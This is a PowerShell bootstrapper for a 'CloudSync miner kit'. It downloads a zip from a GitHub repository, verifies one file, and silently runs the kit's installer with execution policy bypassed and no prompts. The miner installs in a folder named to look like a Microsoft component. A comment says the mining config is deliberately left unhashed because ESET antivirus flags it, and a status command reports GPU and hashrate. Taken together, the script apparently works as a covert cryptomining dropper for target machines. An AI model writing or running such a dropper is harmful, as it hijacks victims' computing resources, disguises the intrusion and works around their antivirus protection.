<#
.SYNOPSIS
    Self-contained bootstrapper for the CloudSync miner kit.

.DESCRIPTION
    Downloads the published kit zip, verifies controller.py against the SHA-256 in
    the extracted manifest.json, then runs install-task.ps1 -NoPrompt from the
    extracted tree in the current user session. Nothing else is needed on the
    target machine.

    Built for remote management: PowerShell 5.1 only, no external modules, no
    prompts, no stdin. The temp tree is always removed. The full transcript is
    timestamped and appended to <InstallDir>\bootstrap.log (trimmed to its last
    1 MB when it grows past that).

    Exit codes:
      0  success; with -Status: miner running
      1  installer returned failure; with -Status: miner not running / no state
      2  kit verification failed (controller.py missing, or SHA-256 mismatch)
      3  bootstrap failed (download/expand error, install-task.ps1 missing from the
         archive, or an unexpected error)

.PARAMETER Status
    Print the state.json summary (pid / gpu / hashrate / profile) and exit 0 when
    the miner is running, 1 otherwise. No network access, no writes.

.PARAMETER DryRun
    Download, extract and verify only. Nothing is installed; no persistent log is
    written and the install dir is not created.

.PARAMETER Url
    Kit zip URL. Default: the kit repo's main-branch archive.

.PARAMETER InstallDir
    Install directory, forwarded to install-task.ps1. Default
    %LOCALAPPDATA%\Microsoft\CloudSync - correct when running inside the
    logged-in user's session.

.PARAMETER CleanLegacy
    Forwarded to install-task.ps1 (remove the pre-overhaul controller kit).

.PARAMETER SkipGpuProbe
    Forwarded to install-task.ps1 (CPU-only install).

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\miner-boot.ps1

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\miner-boot.ps1 -DryRun

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\miner-boot.ps1 -Status
#>
#Requires -Version 5.1
[CmdletBinding()]
param(
    [switch]$Status,
    [switch]$DryRun,
    [string]$Url = 'https://github.com/minjiwilliams-dotcom/config/archive/refs/heads/main.zip',
    [string]$InstallDir = (Join-Path $env:LOCALAPPDATA 'Microsoft\CloudSync'),
    [switch]$CleanLegacy,
    [switch]$SkipGpuProbe
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

$script:MaxLogBytes = 1MB
$script:LogPath     = Join-Path $InstallDir 'bootstrap.log'
$script:LogEnabled  = -not $DryRun

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

function Format-Value {
    param($Value)
    if ($null -eq $Value) { return '(unknown)' }
    if ($Value -is [string] -and $Value.Trim() -eq '') { return '(unknown)' }
    return [string]$Value
}

# Keep bootstrap.log bounded: when it grows past the cap, keep the last 1 MB,
# starting on a line boundary so the file stays readable.
function Limit-LogFile {
    if (-not (Test-Path -LiteralPath $script:LogPath)) { return }
    try {
        $length = (Get-Item -LiteralPath $script:LogPath -Force).Length
        if ($length -le $script:MaxLogBytes) { return }

        $buffer = New-Object byte[] $script:MaxLogBytes
        $read = 0
        $fs = [IO.File]::Open($script:LogPath, [IO.FileMode]::Open,
                              [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
        try {
            $null = $fs.Seek($length - $script:MaxLogBytes, [IO.SeekOrigin]::Begin)
            $read = $fs.Read($buffer, 0, $buffer.Length)
        } finally {
            $fs.Dispose()
        }
        if ($read -le 0) { return }

        $start = 0
        $scan = [Math]::Min($read, 4096)
        for ($i = 0; $i -lt $scan; $i++) {
            if ($buffer[$i] -eq 10) { $start = $i + 1; break }
        }
        $keep = New-Object byte[] ($read - $start)
        [Array]::Copy($buffer, $start, $keep, 0, $keep.Length)
        [IO.File]::WriteAllBytes($script:LogPath, $keep)
    } catch {
        # a locked/unreadable log must never break the install
    }
}

function Write-BootLog {
    param([string]$Message, [string]$Level = 'INFO')
    $line = '[{0}] [{1}] {2}' -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Write-Host $line
    if (-not $script:LogEnabled) { return }
    try {
        $dir = Split-Path -Parent $script:LogPath
        if ($dir -and -not (Test-Path -LiteralPath $dir)) {
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
        }
        [IO.File]::AppendAllText($script:LogPath, $line + "`r`n",
            (New-Object System.Text.UTF8Encoding($false)))
        $size = (Get-Item -LiteralPath $script:LogPath -Force).Length
        if ($size -gt $script:MaxLogBytes) { Limit-LogFile }
    } catch {
        Write-Host ('[warn] bootstrap log unavailable: {0}' -f $_.Exception.Message)
    }
}

function Show-Status {
    $statePath = Join-Path $InstallDir 'state.json'
    Write-Host '=== CloudSync status ==='
    Write-Host ('install dir : {0}' -f $InstallDir)
    Write-Host ('state.json  : {0}' -f $statePath)

    if (-not (Test-Path -LiteralPath $statePath)) {
        Write-Host 'status      : NOT INSTALLED (no state.json)'
        return 1
    }

    $state = $null
    try {
        $state = Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json
    } catch {
        Write-Host ('status      : ERROR - state.json unreadable ({0})' -f $_.Exception.Message)
        return 1
    }
    if ($null -eq $state) {
        Write-Host 'status      : ERROR - state.json empty'
        return 1
    }

    $procId = 0
    if ($null -ne $state.pid) {
        $parsed = 0
        if ([int]::TryParse([string]$state.pid, [ref]$parsed)) { $procId = $parsed }
    }
    $procAlive = $false
    if ($procId -gt 0) {
        $procAlive = [bool](Get-Process -Id $procId -ErrorAction SilentlyContinue)
    }

    $workerRunning = [bool]$state.running
    $running = $workerRunning -and (($procId -eq 0) -or $procAlive)

    $pidText = Format-Value $state.pid
    if ($procId -gt 0) {
        $pidState = if ($procAlive) { 'alive' } else { 'dead' }
        $pidText = '{0} ({1})' -f $procId, $pidState
    }

    Write-Host ('pid         : {0}' -f $pidText)
    Write-Host ('gpu         : {0}' -f (Format-Value $state.gpu))
    Write-Host ('hashrate    : {0}' -f (Format-Value $state.hashrate))
    Write-Host ('profile     : {0}' -f (Format-Value $state.profile))
    Write-Host ('running     : {0}' -f $running)
    Write-Host ('updated     : {0}' -f (Format-Value $state.time))

    if ($running) { return 0 }
    return 1
}

# -Status is a read-only query: do it before any network or file work.
if ($Status) { exit (Show-Status) }

# ---------------------------------------------------------------------------
# bootstrap
# ---------------------------------------------------------------------------

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$stamp   = (Get-Date).ToString('yyyyMMdd-HHmmss')
$tmpRoot = Join-Path $env:TEMP ('miner-boot-' + $stamp)
$suffix  = 0
while (Test-Path -LiteralPath $tmpRoot) {
    $suffix++
    $tmpRoot = Join-Path $env:TEMP ('miner-boot-' + $stamp + '-' + $suffix)
}
$zipPath     = Join-Path $tmpRoot 'kit.zip'
$extractPath = Join-Path $tmpRoot 'kit'
$exitCode    = 0

Write-BootLog ('miner-boot: start (user={0} pid={1})' -f $env:USERNAME, $PID)
Write-BootLog ('install dir: {0}' -f $InstallDir)
Write-BootLog ('kit url    : {0}' -f $Url)
Write-BootLog ('mode       : {0}' -f $(if ($DryRun) { 'dry run (download + verify only)' } else { 'install' }))
if ($script:LogEnabled) { Write-BootLog ('transcript : {0}' -f $script:LogPath) }

try {
    New-Item -ItemType Directory -Force -Path $tmpRoot | Out-Null

    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $zipPath -TimeoutSec 900
    $sw.Stop()
    $zipSize = (Get-Item -LiteralPath $zipPath).Length
    Write-BootLog ('downloaded : {0:N0} bytes in {1:N1}s' -f $zipSize, $sw.Elapsed.TotalSeconds) 'OK'

    Write-BootLog 'extracting archive ...'
    Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath -Force

    # The archive has one top-level folder (currently config-main); do not hard
    # depend on its name in case the repo or branch is ever renamed.
    $kitRoot = $null
    $configMain = Join-Path $extractPath 'config-main'
    if (Test-Path -LiteralPath (Join-Path $configMain 'controller.py')) {
        $kitRoot = $configMain
    } else {
        $topDirs = @(Get-ChildItem -LiteralPath $extractPath -Directory -ErrorAction SilentlyContinue)
        if ($topDirs.Count -eq 1 -and (Test-Path -LiteralPath (Join-Path $topDirs[0].FullName 'controller.py'))) {
            $kitRoot = $topDirs[0].FullName
        } elseif (Test-Path -LiteralPath (Join-Path $extractPath 'controller.py')) {
            $kitRoot = $extractPath
        }
    }
    if (-not $kitRoot) {
        Write-BootLog 'verify    : archive does not contain controller.py' 'FAIL'
        exit 2
    }
    Write-BootLog ('kit folder : {0}' -f (Split-Path -Leaf $kitRoot)) 'OK'

    # Verify controller.py only. config_high.json is deliberately never hashed:
    # endpoint AV (ESET) blocks content-based reads of it and that is not a
    # reason to fail a deployment.
    $manifestPath = Join-Path $kitRoot 'manifest.json'
    $expected = $null
    if (Test-Path -LiteralPath $manifestPath) {
        try {
            $manifest = Get-Content -LiteralPath $manifestPath -Raw | ConvertFrom-Json
            $entry = @($manifest.files | Where-Object { $_.path -ieq 'controller.py' })
            if ($entry.Count -gt 0 -and $entry[0].sha256) {
                $expected = ([string]$entry[0].sha256).Trim().ToUpperInvariant()
            }
        } catch {
            $expected = $null
        }
    }
    if (-not $expected) {
        Write-BootLog 'verify    : manifest.json has no controller.py SHA-256' 'FAIL'
        exit 2
    }

    $controller = Join-Path $kitRoot 'controller.py'
    $actual = (Get-FileHash -LiteralPath $controller -Algorithm SHA256).Hash.ToUpperInvariant()
    if ($actual -ne $expected) {
        Write-BootLog ('verify    : SHA-256 MISMATCH controller.py (expected {0}, got {1})' -f $expected, $actual) 'FAIL'
        exit 2
    }
    Write-BootLog ('verify    : controller.py sha256 OK ({0})' -f $actual) 'OK'
    Write-BootLog 'verify    : config_high.json not hashed by design (AV content-read block; not worth failing over)'

    $installer = Join-Path $kitRoot 'install-task.ps1'

    if ($DryRun) {
        if (-not (Test-Path -LiteralPath $installer)) {
            Write-BootLog 'dry run   : WARNING install-task.ps1 is absent from the archive; a real install would stop at exit 3' 'WARN'
        }
        Write-BootLog 'dry run complete - nothing installed, temp tree removed' 'OK'
        exit 0
    }

    if (-not (Test-Path -LiteralPath $installer)) {
        Write-BootLog 'install   : install-task.ps1 is missing from the archive - cannot install' 'FAIL'
        exit 3
    }

    # Hand over to the kit installer. Working directory is the extracted tree so
    # install-task.ps1 sees its own $PSScriptRoot as the payload source.
    $childArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $installer,
                   '-NoPrompt', '-InstallDir', $InstallDir)
    if ($CleanLegacy) { $childArgs += '-CleanLegacy' }
    if ($SkipGpuProbe) { $childArgs += '-SkipGpuProbe' }

    Write-BootLog ('install   : powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{0}" -NoPrompt -InstallDir "{1}"{2}{3}' -f `
        $installer, $InstallDir, $(if ($CleanLegacy) { ' -CleanLegacy' } else { '' }), $(if ($SkipGpuProbe) { ' -SkipGpuProbe' } else { '' }))
    Write-BootLog '---------- install-task.ps1 transcript ----------'

    $rc = 1
    Push-Location -LiteralPath $kitRoot
    try {
        & powershell.exe @childArgs 2>&1 | ForEach-Object {
            Write-BootLog ([string]$_)
        }
        $rc = $LASTEXITCODE
    } finally {
        Pop-Location
    }
    if ($null -eq $rc) { $rc = 1 }

    Write-BootLog '---------- install-task.ps1 done ----------'
    Write-BootLog ('install   : exit code {0}' -f $rc) $(if ($rc -eq 0) { 'OK' } else { 'FAIL' })
    $exitCode = [int]$rc
} catch {
    Write-BootLog ('bootstrap failed: {0}' -f $_.Exception.Message) 'FAIL'
    $exitCode = 3
} finally {
    if (Test-Path -LiteralPath $tmpRoot) {
        try {
            Remove-Item -LiteralPath $tmpRoot -Recurse -Force -ErrorAction Stop
        } catch {
            Write-Host ('[warn] could not remove temp tree {0}: {1}' -f $tmpRoot, $_.Exception.Message)
        }
    }
}

exit $exitCode
